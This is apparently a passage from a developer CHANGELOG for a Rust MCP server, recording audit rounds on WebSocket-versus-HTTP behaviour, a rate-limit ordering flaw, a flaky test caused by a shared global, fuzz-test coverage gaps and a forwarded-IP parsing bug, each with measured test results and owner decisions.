- **`/v1/ws` had never been probed on the wire: it answers the calls HTTP answers byte-identically, and diverges in six measured places, three of which lose the request with no reply, no id, and no log line (2026-10-13).** The transport is in the documented surface (`docs/API.md:68`, `docs/USER_GUIDE.md:464`) and appears in no audit round before this one: every NDA-vs-JSON and per-transport differential since #501 measured `POST /v1/mcp`, `/v1/mcp/nda`, stdio or shmem, so everything said about WS was code-reading, not measurement.
  - **Setup, and the limits of every number below.** A debug build of current source, `--features http` only, `BUILD_REAL_EXIT=0` (`wsbuild531.log`), started on scratch port **3915** so the operator's `:3900` demo server (PID 17216) and its `target/release` image were never touched; the 593-line server log captured during the probes (`wshttp531.log`) is that same process output, which is what binds these numbers to that build. Not exercised: **authentication** (`api_key` unset across the whole probe set, so the WS auth path is still unmeasured), the `database` and `oauth2` code paths, more than one peer (single client on 127.0.0.1), and the **shipped release exe**, which still predates the fixed guests (#494) — so nothing here describes the crates.io or Docker Hub artifact. Two probe artifacts named so they are not read as server behaviour: the first metrics read asked `/metrics` and got 404 with 0 bytes (the real routes answered `/v1/metrics` 200 / 173 B and `/v1/performance` 200 / 552 B), and `tools.listChanged: true` is advertised verbatim on the WS `initialize` reply while its *delivery* remains the fan-out scope recorded in this file's *Added* section — `/v1/sse` and the streamable-HTTP POST session only, which is to say WS cannot receive it.
  - **Where the two transports agree, which retracted an inference made before probing.** WS and HTTP both call `json_rpc::handle_request`, and two calls returned **byte-identical** bodies on both: `tools/call echo` (id 3, text `"ping\n"`) and `-32601 Method 'no_such_method' not found` (id 4). Before the probe I reasoned that WS would inherit the per-transport divergence filed under #502 and #509. It does not, and the reason is worth keeping: those two findings live in the **stdio and shmem dispatchers**, which are different code from this handler.
  - **Two limiters, charged at different points, that both measured to 101/99 by different routes.** The axum `rate_limit_middleware` is layered on the `/v1` protected router (`src/transport/http.rs:1573`) and is per-peer 20/s with burst 100 (`src/rate_limit.rs:16`, `:17`, `check_rate_limit_for_peer` at `:201`); for a WebSocket it is charged **once, on the HTTP upgrade**. 200 frames over one connection in **13 ms** produced `ok=101 rl=99`, which is the per-connection bucket declared at `src/transport/http.rs:1241-1245` (50/s, burst 100) and not the 20/s one. The same 200 calls as 200 concurrent HTTP POSTs produced `{"200": 101, "429": 99}` — the identical split, from the *per-peer* bucket, because each request takes one middleware charge. Both probes reconcile against the server's own count: **129** `WebSocket rate limit exceeded` lines = 99 + 30. Two paced controls show the buckets are the whole gate: 300 WS frames at 33.8 rps → `rl32008=0`, and 300 HTTP POSTs at 21.8 rps → `got429=0`.
  - **The refusals are uncorrelatable, and the transports disagree on both the code and the id.** Every WS refusal is `-32008 Rate limit exceeded` with `"id": null` (`src/transport/http.rs:1276`): `rl_id_field_types=["null"]`, and `unanswered_ids_count=99` — 99 of the 200 request ids are never carried by any reply. HTTP answers the same condition with `-32000` **and preserves the id**. A client that pairs replies to requests by id therefore stalls on WS and self-heals on HTTP.
  - **The size arm runs before the token charge, so oversized frames are refused for free and indefinitely.** `text.len() > 1_048_576` (`:1250`) `continue`s, and the refill-and-charge block sits below it at `:1284`. The drain probe sent 130 back-to-back pings, then **in the same tick** one tiny ping (id 501), twenty 1.2 MB frames (ids 601-620) and a second tiny ping (id 503). Measured: `error_code_hist={"-32008": 30, "-32700": 20}` — **all 20** oversized frames were answered although the bucket had been drained 30 requests earlier — while `id501=NO_REPLY`. `id503=OK` is the 50/s refill, not a counter-example. A client can thus be refused forever by oversized frames at zero token cost. Both arms are also unauditable after the fact: the rate arm logs one warn per refusal, the size arm logs **nothing** — the single "too large" string anywhere in the 593-line log is `wshttp531.log:591`, an access-log INFO for the HTTP 413 leg, not a WS refusal. One residual stays unexplained rather than smoothed: `frames=152` against 102 id-bearing replies plus 50 null-id errors, so one send was answered twice somewhere the probe's id map cannot localise. It does not bear on the bypass, which is carried by the two directly observed verdicts.
  - **The two transports enforce different ceilings, and no configuration reaches the WS one.** WS accepts a frame of exactly **1,048,576** bytes and refuses **1,048,577** (`WS replies=3 codes=["OK",-32700,-32700]` across 1 MiB, 1 MiB+1 and 12,000,000) and never reads `[http].max_request_size` (`src/config.rs:326`, default 10 MiB). HTTP on the same process accepted 9,000,060 B → 200 and refused 11,000,060 B → **413 with a 56-byte plain-text body**, `Failed to buffer the request body: length limit exceeded`, which is not a JSON-RPC error object at all. So a 2 MB payload is `-32700` over WS and a success over HTTP inside one server — measured at 1.5 MiB: WS `-32700`, HTTP 200 carrying the guest's own in-band `Plugin argument 0 exceeds 10KB limit (1600000 bytes)` — and the operator cannot raise the WS ceiling by configuration.
  - **Two shapes lose the work entirely.** A **binary** frame whose payload is valid JSON produced `reply frames: 0`: `Ok(Message::Binary(_))` has no arm and falls into `_ => {}` at `:1331`. A JSON **batch array** produced `batchFrames=0` for a two-element array, while the identical body posted to `/v1/mcp` answers 400 `-32600` "Invalid Request: batch requests must be posted to /v1/mcp/batch"; the WS path structurally cannot reply to a batch, because `if let Some(resp)` at `:1299` sends nothing when the handler returns `None`. Both are silent: the connection survives (the `ping` sent right after the binary frame was answered `{"id":10,"jsonrpc":"2.0","result":{}}`), so nothing tells a client its call was dropped, and an NDA-over-WS client would see only a hang. A trap worth recording: the first probe "saw" a batch reply, and it was a stale frame left by the preceding single `tools/list` — the dedicated windowed probe is the one that reads 0.
  - **Sessions and the audit registry are two stores, the admin surface reads only one, and this is not a WS bug.** After the probe set, `/v1/admin/audit/summary` reported `totalSessions: 9`, of which **7** are `ws-*` ids — minted at `src/transport/http.rs:1232`, where only the audit context is set; `state.sessions` has exactly two insert sites, `:539` for SSE and `:703` for the streamable-HTTP POST — while `GET /v1/sessions` returned `{"sessions": []}`, `/health` reported `activeSessions: 0`, and `DELETE` of a `ws-*` id returned **404**. The HTTP path reproduces all of it without any WebSocket: a client-chosen `X-Session-ID: alpha531` gave `totalSessions=10 … has_alpha531=true`, the same empty `GET /v1/sessions`, the same **404** DELETE — and yet its audit export answered **200 with 197 bytes**. So a tenant's audit trail is readable while the session that owns it can be neither listed nor revoked over every non-SSE transport. Separately, the registry is bounded at `MAX_AUDIT_SESSIONS = 1024` (`src/audit.rs:350`) and evicts by `sessions.keys().next()` (`:353`) while the warn it emits claims `"evicted oldest session"` (`:356`) — `HashMap` iteration order is neither oldest nor insertion order, so that log line mislabels which tenant lost its trail.
  - **What landed this round: only the non-wire repairs.** `src/transport/http.rs:1280` told the next reader that a rate-limited frame would "Continue processing but log the violation"; the code drops the request un-answered, so the comment now states the measured fact in one line, line-neutral: the request is dropped, not deferred, and the frame's `id: null` is uncorrelatable. Documentation corrected to the probes: `docs/USER_GUIDE.md:464` (one JSON-RPC object per **text** frame; a binary frame or a JSON array gets nothing), `:465` (session scope limited to the two routes that register one), `:471` (`/v1/ws` does not read `max_request_size` and enforces its own 1 MiB per-frame cap), `:1063` (the Input Size Limits rows for both transports) and `docs/API.md:68` (the WS row).
  - **Six wire-visible items filed as bless-or-revert owner calls, none fixed,** because each changes what a client observes: (1) accept binary frames or reject them explicitly instead of dropping them; (2) batch-array parity with HTTP's 400 `-32600`; (3) honour `[http].max_request_size` on WS, or document the hardcoded 1 MiB as the cap; (4) `-32008` → `-32000` and echo the request `id` on refusals; (5) move the size check after the token charge, or charge oversized frames; (6) register WS and header-supplied sessions in `state.sessions` so they are listable and revocable, and correct the `"evicted oldest session"` wording.

- **The `resources.rs` guard set this file called the complete set of queue-touching code had missed a fourth mutator, and the flake it left can red two CI legs (2026-10-13).** Found by this round's verification gate rather than by design, so the entry starts with the red.
  - **The red.** `cargo +stable test --workspace --features http,database,oauth2` returned `FEAT_REAL_EXIT=101` with the lib row at **814 passed / 12 failed / 38 ignored**, and only **11** of cargo's 30 `test result:` rows printed, because the run aborts at the first failing binary. None of the WS round's edits touched `resources.rs`, so red meant either a new defect or an old flake arriving — a distinction that had to be measured, not assumed.
  - **Proving flake before diagnosing.** The same command re-ran at **826 passed / 0 failed** — the same 826 total, so no binary had stopped running — and the 12 named tests run serially with `--test-threads=1` gave **40 passed / 0 failed**. A concurrency signature, not a dependency one.
  - **The mechanism.** One process-global `OnceLock<Mutex<ResourceStore>>` (`src/resources.rs:90`) backs every accessor. `notify_update` (`:274`) drains `..5000` once `pending_updates.len() >= 10_000` and then pushes one, while `poll_resource_updates` (`:560`) `mem::take`s the same queue — so a test that seeds toward 10k and a test that asserts "my update comes back" interfere through one global with no ordering between them.
  - **What the earlier claim said, and why it was wrong at birth.** This file recorded the guard as covering "the only three queue-touching tests" and called that set complete. The enumeration keyed on `notify_resource_update` (`:552`) and `poll_resource_updates` (`:560`) — both of which genuinely have **zero** production callers — and missed `test_notify_update_caps_at_10k` (`:1427`), which reaches `pending_updates` directly through `get_resource_registry()` (`:1429`) without naming either helper. `git show HEAD:src/resources.rs` establishes that the cap test predates the guard, so the completeness claim was false the moment it was written rather than invalidated later. That round's evidence — three consecutive full `--lib` runs, exit 0 each — was luck, not a fix: the same shape measures 5 reds in 40 iterations.
  - **Measured before and after, and the one-line fix.** Pre-fix loop of the lib-test binary: **5 FAIL in 40** iterations (12.5 %), at iterations 11, 15, 25, 28 and 37, each red run carrying 11-13 collateral failures (`collateral_tests=13/11/12/13/12`; ledger `flake532_red.log` and its eight siblings). Post-fix, same shape: **60 iterations, 60 ok / 0 FAIL** (`flake532_post.log`, marker `LOOP2_DONE`). The repair is one line, `let _queue = lock_update_queue();` at `src/resources.rs:1428`, enrolling the fourth test in the existing `UPDATE_QUEUE_GUARD` (`:965`); the guard's doc comment (`:963-964`) was rewritten **line-neutrally** to state the four-test set and to stop treating "no production callers" as if it implied "no other mutators".
  - **Why one unguarded test redded twelve, and the part left open.** A panic while a `MutexGuard` is alive poisons the registry, and **all 11 production arms** on that lock degrade silently instead of failing: 5 `if let Ok(mut s)` writes that discard the write with no error channel (`:475`, `:490`, `:509`, `:526`, `:554`), 3 that return `vec![]` (`:562` `poll_resource_updates`, `:571` `list_resources`, `:580` `list_resource_templates`), and 3 that map to `Err("Resource store poisoned: …")` (`:536`, `:545`, `:589`). On the wire that means a poisoned registry answers `resources/list` and `resources/templates/list` with `[]` **and reports success**. `lock_update_queue` itself deliberately `into_inner()`s the poison (`:969-970`) so one panic cannot brick the rest of the module — correct for a test serialiser, and the reason the cluster stayed intermittent instead of turning permanent. Two owner calls filed, not taken: make the accessors hard-fail (wire-visible — an empty `resources/list` becomes an error), and make the cap test hermetic by seeding a local `ResourceStore` instead of the global, which would retire its guard entirely.
  - **CI exposure.** `.github/workflows/ci.yml:55` (`cargo test --workspace --verbose`) and `:58` (the featured leg) both run the lib-test binary, so at the measured 12.5 % per-run rate this flake could redden a CI leg roughly once in eight pushes with no product defect behind it and no failing assertion to find.
  - **Gates on the fixed tree.** `cargo +stable fmt --all -- --check` exit **0** with `src/resources.rs` at 1,666 lines; `cargo +stable clippy --features http,database,oauth2 --tests` → `CLIPPY_RC=0`; `cargo +stable test --workspace` → **1,161 passed / 0 failed / 55 ignored across 30 `test result:` rows**, `PLAIN_REAL_EXIT=0`; the featured leg → **1,233 / 0 / 55**, `FEAT_REAL_EXIT=0`. Both match the published baselines exactly, as expected of a round that adds no test function — read off cargo's own summary rows, not inferred. The dashboard suites were not re-run, and the reason is stated: they drive `target/release/velocity_mcp.exe`, whose relink is blocked by the operator's `:3900` server (#494) and is an operator decision, not a test gap. The WS probes above are this round's substitute evidence, taken against current source.
  - **One line of drift, measured twice instead of quoted.** Re-running the drift experiment rather than carrying this round's own notes turned up a wrong inherited figure. The notes recorded "a single extra line in a cited file flips 8 verdicts". Inserting a comment line into `src/resources.rs` and re-running `python scripts/check_citations.py` measures **one** moved verdict at line 801 (620 checked / 480 populated / 0 hard / 132 advisory / 8 allowed) and **five** at line 235 (620 / 476 / 0 / 136 / 8) — five, not eight, and position-dependent, because a one-line shift strands only those cites whose new line lacks the citing sentence's tokens. Both runs exit **0** with 0 hard failures; the file was then restored byte-exact (`cmp` clean against the pre-probe copy, back to 1,666 lines) and the census returned to its fixed point of **620 / 481 / 0 / 131 / 8**, exit 0. Two standing limits of the instrument, both demonstrated by this round's own pointers rather than asserted: `CITATION_RE` (`scripts/check_citations.py:29`) requires a filename with an extension before the colon, so bare `:NNN` cites are invisible to it, and a drifted pointer is not a red gate but a green one.
  - **Placement, and what this insert moves.** Both bullets went in at the top of `### Fixed` to keep the section newest-first — the finding above the gate that surfaced it — shifting every line below by 24. `CHANGELOG.md:185` is the deliberately stale self-pointer this file has twice declined to re-anchor, because the owning sentence disclaims it and the next append breaks it again; this round moves it once more and leaves it, at seven occurrences as the insert lands — two on the #530 *Placement* sub-bullet, one on its *Gates* sub-bullet, two on the #529 *Placement* sub-bullet, one further down and this bullet's own mention. What this round falsified is a set of present-tense positions: the #529 sub-bullet asserted that the oversized-argument bullet "is now at `:148`", which was true of its own run and false by the time this probe ran — `:148` held the cold-vs-warm capability bullet while that one sat at `:157` — and this insert then moved the pointer onto a blank line. All three positions were repaired in place and line-neutrally, restated as of-run with current targets appended. The pairing is worth keeping because it degraded rather than merely moved. Before this insert the six pointers measured against a populated line 148: **four** satisfied the token test, one via the incidental substring `all`, two via `tool` and `was`, and **two** did not, so a pointer whose referent had moved still read as resolved. After it the instrument classifies **all seven** as *blank*-line advisories — the `:148` pointer now lands on an empty line — while the gate holds at exit 0 with **0** hard failures, i.e. the same pointer went from a green-but-blind token match to a named-but-harmless blank advisory without one non-zero code. That is the union-token blindness already recorded on the `src/rate_limit.rs:189` repair, now demonstrated on a pointer into this file itself. Census after every edit in this round: **638 checked / 487 resolve to a populated line / 0 hard failures / 143 advisory / 8 allowed**, exit 0, against the pre-insert fixed point of 620 / 481 / 0 / 131 / 8 — this entry's own 18 added pointers, of which 6 populated and 12 advisory, and the repairs above moving zero verdicts across two consecutive runs.

- **`tests/interpreter_audit.rs` printed `OK` for a guest refusal, and the round that named one such cell under-counted it: the matrix holds three (2026-10-12).** That suite is the instrument which produced the interpreter findings published under #496. It cannot go red, so its printout is the only evidence it offers — and that printout read a refused program as a capability pass. The label is repaired; no assertion was added.
  - **The defect.** `run_test` (`tests/interpreter_audit.rs:483`) drives six languages (`php`, `csharp`, `java`, `r`, `julia`, `perl`) per section through a `match test_fn(rt.as_mut(), lang)` whose `Ok` arm unwrapped `parsed.get("message")` and then printed `OK` for **any** `Ok(result)`. An interpreter that refuses a program returns `Ok` at the harness level while carrying `{"error": "..."}` in-band, so a refusal printed exactly like a pass. The `Err` arm (`:514`-`:516`) only `println!`s `FAIL`, and no assertion exists anywhere in the file: the suite exits **0** whatever every cell does.
  - **Measured full matrix, before the edit.** `cargo +stable test --test interpreter_audit -- --nocapture --test-threads=1` → **10 passed / 0 failed**, finished in 7.69 s, `REAL_EXIT=0`. Ten sections x six languages = **60** cells: **55 printed OK, 5 printed FAIL**. Of those 55 OK cells, **15 carry an in-band `error` payload**. Reading this off the default parallel run is a trap worth naming: cargo interleaves the threads' `println!`s, so all 15 error cells first appeared inside a single section, and the same serial re-run also finished 5.4x faster (7.69 s against 41.48 s parallel) because the six per-cell `cold_start` calls stop contending.
  - **12 of the 15 are the intended outcome, which is why the repair labels the channel instead of inverting the verdict.** `=== Division by zero (error handling) ===` and `=== Undefined variable (error handling) ===` exist to make the guest refuse, and all six languages answer `{"error":"division by zero at line 2"}` and `{"error":"undefined variable 'undefined_var' at line 2"}` respectively; a repair that turned in-band errors into failures would delete the suite's only two error-path sections. **3 cells are genuine false greens, all perl**: Closures-with-mutable-state and Deep-recursion(`fib(20)`) print `undefined variable 'my' at line 3`, and Higher-order-functions prints `parse error: unexpected token at line 5 col 16`. #496 named one of these three; the count across the matrix had never been taken, only within the section that round was chasing.
  - **The fix is one label.** The `Ok` arm (`:500`-`:513`) now branches on `parsed.get("error")` before picking its message field, so an in-band refusal prints `ERR-RESULT`, a value prints `OK`, and a harness `Err` keeps printing `FAIL`. Re-run on the edited tree: **40 OK / 15 ERR-RESULT / 5 FAIL = 60**, still **10 passed / 0 failed**, `REAL_EXIT=0`, 7.23 s — fifteen cells moved out of the OK column and nothing else changed.
  - **Why no assertion, and what the probe found in place of one.** Metering counts are deterministic per `.wasm` byte, so gating on this suite's output would hand Linux CI the same five `call failed: RuntimeError: unreachable` traps the shipped 10M budget already produces for `fib(20)` (php, csharp, java, r, julia under `=== Deep recursion (fib(20)) ===`). Raising the audit's limit, narrowing `test_deep_recursion` to `fib(15)`, and making `run_test` assert stay owner calls. The live question behind the perl cells — capability gap or fixture syntax — was answered by a revertible probe instead of left filed: stripping only the keyword `my` from the four perl fixture lines (`:58`, `:117`, `:118`, `:312`) and re-running turned **Closures into `perl: OK - 1,2,3`**, so that capability exists and the fixture was its own defect; Deep recursion then failed one step later on `$_[0]` (`undefined variable '_' at line 3`) and Higher-order functions still on `$fn->($x)` (line 5), so those two sections need `$_[...]` and arrow-call support in the shared C core, not just `my`. The probe was reverted and the file verified byte-identical to its backup (`cmp` clean); no checked-in fixture changed in this round.
  - **Placement, and what this insert moves.** The bullet went in at the top of `### Fixed` to keep the section newest-first, shifting every line below it by nine, including all three occurrences, as of that run, of the deliberately stale `CHANGELOG.md:185` self-pointer — two on line `:56` and one on `:200` before this insert, measured at two on `:65` and one on `:209` after it — not re-anchored, the same call #529 made, since the sentence owning that pointer already disclaims it. (This bullet mentions the string three times itself, twice on this line and once on the next, so the file then carried six occurrences of `CHANGELOG.md:185` — those three stale pointers plus this bullet's three mentions; at that run the gate parsed all six as citations and four of them resolved, because only line 54 of this bullet claimed a token its target lacked. That count is no longer live either: this round's insert added a seventh mention, moved the pointer off the bullet it used to land on and onto a blank line, and the instrument now classifies all seven as blank-line advisories while still exiting 0 with zero hard failures.) Inside the #496 entry the cite of the print block was re-anchored in place from `:499`-`:512` to `:499`-`:517` (five lines longer after this round's edit) and its two sentences describing the old printout were corrected; `:330`, `:475`, `:489`-`:497` and `:312` were re-read against the edited file and still land where described.
  - **Gates re-measured on this tree.** `cargo +stable fmt --all --check` exit 0 and `cargo +stable clippy --test interpreter_audit --all-targets -- -D warnings` exit 0. `cargo +stable test --workspace` → **1,161 passed / 0 failed / 55 ignored across 30 `test result:` rows**, `REAL_EXIT=0`; the featured profile `--features http,database,oauth2` → **1,233 / 0 / 55**, `FEAT_REAL_EXIT=0`. Both match #529 exactly, as expected for a round that adds no test function — read off cargo's own rows, not inferred. Citation census at its two-run fixed point: **620 checked / 481 resolve to a populated line / 0 hard failures / 131 advisory / 8 allowed**, exit 0. That is #529's **613 / 478 / 127 / 8** plus exactly the seven pointers this entry writes about itself — two to `tests/interpreter_audit.rs:483`, three mentions of `CHANGELOG.md:185`, two to `scripts/check_citations.py:29` — and the split is that same self-reference: **+3 populated, +4 advisory**, and the instrument's own rows say which is which: the four advisories are line 54's two `:148` mentions (that line is the bullet's only claimant of the token `Fixed`, and line 148 does not carry it) plus this line's two cites of that script's line 29, while the three populated cells pass on tokens their line happens to share — `run_test` for line 49's `:483`, and the incidental substrings `test` and `all` for this line's `:483` and `:148`. That last part is a limit of the gate, not a pass: `claim_tokens` keys on the whole markdown line, so every citation on a line shares one token set and an `any()` over it lets an unrelated substring satisfy a claim. Nothing but this entry's own text moved, so the nine-line insert drifted no pre-existing cite into a stale claim. Note what it cannot see: `CITATION_RE` (`scripts/check_citations.py:29`) requires a filename with an extension before the colon, so the bare `:NNN` cites inside the #496 entry are invisible to the gate — which is why the re-anchor there was done by hand and re-read against the edited file rather than trusted to a green census. `scripts/check_doc_examples.py` exit 0 (**102** gated json blocks across 337 markdown files, **6** advisory blocks in generated wiki pages). No production file, guest `.wasm`, or CI step changed, so this is not a wire change and joins no bless-or-revert batch; the dashboard suites were not re-run because nothing they drive was touched.

- **CI's `fuzz-tests` leg has been green since 2026-09-14 on four properties that measurably never reach the code they claim to test (2026-10-12).** The leg itself (`.github/workflows/ci.yml:75` job, `.github/workflows/ci.yml:88` step `cargo test --test fuzz_tests --verbose`) is not the defect; its green is. Two properties added, one closed question re-opened, and two shallow arms recorded instead of silently kept.
  - **The September reds were a real build failure, already fixed in committed history — which is what makes the current green worth reading.** Run `34823957314` (2026-09-14T08:41:07Z, `Property-Based Fuzz Tests`, Linux x64) failed to compile, not to hold: **73** occurrences of `error[E0433]: cannot find module or crate \`libc\` in this scope`, all in `src/sandbox/linux_seccomp.rs`, one per line across `:62`–`:147`, and **no other error code anywhere in the 1,922-line log**. The run's own checkout is `origin/main` at `80c33eec7b1457ce3ad3dc09420d7a9a93f2058d`, whose `Cargo.toml` contains **0** occurrences of `libc`; `libc = "0.2"` was added under `[target.'cfg(target_os = "linux")'.dependencies]` 3 h 33 min later by `88a92de` (2026-09-14 14:14:54+0200), an ancestor of HEAD. GitHub's job payloads then report `Run fuzz tests=success` on all three subsequent runs (`34843584303`, `35001812106`, `35286038255`). So nothing was weakened to buy that green — and that is exactly why the finding stands: an honest green gate can still gate nothing.
  - **What the unstructured props actually reach, at 200 000 cases per arm**, classified by the strings `NdaDocument::read` returns (`src/nda_document.rs:91`) rather than by keywords: fully random bytes → length guard **10.231 %**, magic guard **89.769 %**, nothing past guard 2 of the read pipeline. Valid magic + random tail → triple-count cap **90.256 %**, command-count cap **0.087 %**, length **9.657 %**, deepest guard 5, and **0 of 200 000 cases reach the offset arithmetic**. The whole bounds-validation band — the only part of the parser where an index can go out of range — was never entered by `prop_random_bytes_never_panic` or `prop_random_bytes_with_valid_magic_never_panic`.
  - **The shipped Merkle default silently walls the NMCP prop off from its subject.** `NMCP` magic + random tail at `NDA_MERKLE_ENABLED = true` (`src/protocol/nda_native.rs:42`, the default CI runs under) → short-frame **6.3505 %**, Merkle mismatch **93.6495 %**, and **0 of 200 000** entries into `decode_json_value` (`src/protocol/nda_native.rs:181`). The same generator with the flag toggled off reaches the decoder **93.481 %** of the time (parse-`Ok` 0.100 % + TLV decode error 2.290 % + the 91.091 % tail, whose **114** distinct messages are all `Unknown TLV type tag: 0xNN` or `Unexpected end of TLV buffer`). That correction is published, not the first capture: the 91.091 % class initially fell into an "other" bucket because the classifier keyed on the prefix `TLV`. Toggling the flag from a test would move process-global state — the #518/#526 interference class — so the new TLV property calls the decoder directly and leaves the global alone.
  - **`prop_nda_offset_validator_and_resolver_agree`** (`tests/fuzz_tests.rs:435`) builds a minimum-valid 1-triple / 1-command document with an ASCII string pool (an invalid-UTF-8 pool would make `get_string` fail for a reason unrelated to bounds, `src/nda_document.rs:295`) and asserts the invariant the parser relies on in both directions: every non-zero offset that runs past the pool must be refused by `read()`, and every offset `read()` accepts must resolve through `get_string()`. This is the first property in the file whose generator lands in the band the measurements above showed empty — structured mutation reaches triple-offset validation **83.030 %**, command validation **11.6635 %**, parse-`Ok` **5.3065 %**.
  - **`prop_tlv_decoder_mutation_never_panics`** (`tests/fuzz_tests.rs:503`) round-trips a generated JSON value, then truncates and single-byte-corrupts the *encoded* TLV: no panic, and if the decoder accepts a mutated value the zero-alloc walk must agree on the consumed length (`src/protocol/nda_native.rs:402`) and must not refuse it. That is the one-directional claim #523 established, now gated on every run rather than argued once. Both props run 500 cases; `cargo test --test fuzz_tests` → **19 passed / 0 failed** (17 before), `cargo fmt --all --check` exit 0, `cargo clippy --test fuzz_tests -- -D warnings` exit 0.
  - **Negative control, and what it revealed about the guard's real job.** Forcing the triple validator's bounds check false (`if o.saturating_add(2) > string_pool.len()` at `src/nda_document.rs:236` → `if false && …`) turned the leg red: **17 passed / 2 failed**, `REAL_EXIT=101`, failing in `prop_nda_offset_validator_and_resolver_agree` **and** the pre-existing `prop_tampered_signature_always_fails`, both panicking at `src/nda_document.rs:245:63` — first printing `index out of bounds: the len is 28 but the index is 85`, and shrinking to the `4278190538`–`4278190541` family against a 645–648-byte pool. So the finding is finer than "nothing reaches the band": the signature prop does reach it incidentally, but only as a `panic!` indistinguishable from a signature-verifier defect. The new prop converts that same region into an attributable assertion. The mutation was reverted and the file verified byte-identical to its backup (`cmp` clean). One artifact of that run stays, deliberately: proptest wrote the injected failure's shrunk seed into this suite's tracked regressions file (tests/fuzz_tests.proptest-regressions, `cc 9a8902b7`, four empty triples at tamper position 52), and cargo replays recorded seeds before generating anything novel — so a case inside the band these measurements showed to be otherwise unexplored became a deterministic first test instead of luck of the draw. Re-measured on the reverted tree: **19 passed / 0 failed**, with that seed replayed.
  - **Two arms stay shallow and are named so nobody re-counts them as coverage.** `prop_sandbox_always_cleans_up` (`tests/fuzz_tests.rs:243`) has `Err(_) => return Ok(())` on `Sandbox::new()`, so on any host where the sandbox cannot start the property is unconditionally green; and `prop_is_nda_frame_correct` (`tests/fuzz_tests.rs:276`) computes its oracle as `data.len() >= 4 && &data[0..4] == b"NMCP"`, the same predicate the implementation applies, so it pins the definition but cannot detect a predicate change. Neither is wire-visible and neither was approved for change this round: both are owner calls, not fixes.
  - **Placement, and the one citation this insert moves.** The bullet went in at the top of `### Fixed` to keep the section newest-first, which shifts every line below it by eleven, including the file's only self-pointer, `CHANGELOG.md:185`, a position this clause below restates as of its own run and no further. That span was deliberately **not** re-anchored: the sentence owning it already disclaims it ("**No number in this clause is live today**"), and re-pointing a pointer that the next append breaks again just moves the rot. Measured rather than assumed, so the blind spot is on the record: at that run, both before and after that insert, `CHANGELOG.md:185` was a perfectly *populated* line — an unrelated bullet, `An oversized tool argument was truncated by the guest instead of refused`, at `:137` before it and `:148` after — while the capability-report bullet it had been re-pointed to last round had moved to `:159` and the stale-citation entry the pointer actually means sat at `:130` and `:172`; those five positions are that run's, the same three targets sit at `:181`, `:192` and `:163` plus `:205` as this round lands, and `:148` itself is now a blank line. A line-index instrument reports this green at every step of that drift; that is the census-green/lands-anyway class `CHANGELOG.md` itself names, now with a second instance.
  - **Measured after**: `cargo test --workspace` → **1,161 passed / 0 failed / 55 ignored across 30 test binaries**, `REAL_EXIT=0`; featured `--features http,database,oauth2` → **1,233 / 0 / 55**, `REAL_EXIT=0`. Both are +2 over the 1,159 / 1,231 published under the entry below and the +2 is exactly the two new props — read off cargo's own summary rows, not from that arithmetic. No production file changed, so this is not a wire change and joins no bless-or-revert batch; the dashboard suites were not re-run because nothing they drive was touched. #524 remains open: the known decoder-vs-walk divergence lives in the *other* direction (the walk over-cap accepts, the decoder refuses) and stays an owner call, which is why the new assertion is green today. CI's own literal lint command — `cargo +stable clippy --features http,database,oauth2 --all-targets -- -D warnings` — was re-measured on this tree and exits 0, which matters because the new file is now inside what that gate compiles. **Documentation currency for this round went to the development guide, not to section 9 of the NDA protocol doc.** That section is a per-runtime protocol matrix and says nothing about test suites, so writing a coverage finding there would have mis-shelved it; the file that actually instructs a reader how to run the suites is `.qoder/repowiki/en/content/Development Guide.md`, and auditing it for this round found four stale suite counts plus one unrunnable command: the fuzz block claimed 17 properties and "3400+ random cases" (the file has 19 properties and 4,650 generated cases before shrinking), the proc-macro block said 8 and offered `cargo test -p velocity_mcp_macros`, which measures **0 passed / 0 failed / 1 ignored** — the crate declares no test functions, and the lone ignored item is an `ignore`-tagged rustdoc example at `macros/src/lib.rs:24`, which is the single doctest inside cargo's 55 ignored — while the two macro suites, measured at 8 passed and 4 passed, live in the root `tests/` directory instead. The block is now corrected to those measured figures and names the real targets, written line-neutrally (9 insertions, 9 deletions, so no line of that file moved and no citation of it needed re-anchoring). The 4,650 is re-derived from the file rather than carried forward: 14 `proptest!` blocks, all 19 properties under an explicit `with_cases` budget (50 ×1, 100 ×6, 200 ×6, 300 ×1, 500 ×5), where a block's attribute governs every property it precedes — which is why both new props run 500, not just the first.

- **Every proxied Edge client shared one rate-limit bucket, and the five tests filed as the security suite for that code path gated nothing (2026-10-12).** Two defects, one in the binary and one in the evidence.
  - **The code (`crates/velocity-mcp-edge/src/main.rs:409-429`, HEAD's `extract_client_ip`).** The forwarded chain was scanned right-to-left with `.find_map(|ip| ip.parse::<SocketAddr>().ok())`. `SocketAddr` requires a port, and conventional proxies write bare addresses, so a standard `X-Forwarded-For: 203.0.113.5` never parsed and the `Option` fell through to `.unwrap_or(peer_addr.ip())`. Measured against HEAD, from peer `127.0.0.1` with that header: `assertion \`left == right\` failed, left: 127.0.0.1, right: 203.0.113.5` (`e527_red.log`). A second, independent hole sat in the same expression: the `.filter(|addr| !is_trusted_proxy(*addr))` applies to the single `Option` `find_map` returns, so a trusted *rightmost* entry — which is what a second internal hop appends — aborts the whole scan instead of continuing leftward. Measured with `X-Forwarded-For: 198.51.100.7, 203.0.113.5, 10.0.0.1` from peer `10.0.0.2:5555`: HEAD returned `10.0.0.2`, the fixed code returns `203.0.113.5`. Both land on the same key: `RATE_LIMIT_PER_MINUTE` buckets per client IP, so behind a proxy the allowance was one shared pool for all clients of that instance — and on Wasmer Edge the WASIX socket server *is* behind the platform proxy, which is the deployment this binary ships to.
